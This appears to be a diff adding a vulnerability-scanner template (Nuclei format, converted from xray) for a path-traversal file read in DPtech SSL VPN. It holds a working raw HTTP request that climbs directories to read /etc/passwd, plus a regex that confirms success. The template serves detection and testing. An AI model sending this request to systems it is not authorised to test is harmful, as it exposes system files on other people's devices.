@@ -1,0 +1,25 @@
+id: poc-yaml-dptech-vpn-fileread
+
+info:
+  name: poc-yaml-dptech-vpn-fileread
+  author: cysec
+  severity: medium
+  tags: xray-converted,ct-446205
+  reference:
+    - https://vul.wangan.com/a/CNVD-2020-68895
+
+http:
+  - raw:
+      - |
+        GET /sslvpn/img/../../../../../../etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        part: body
+        regex:
+          - "(root|toor):[x*]:0:0:"
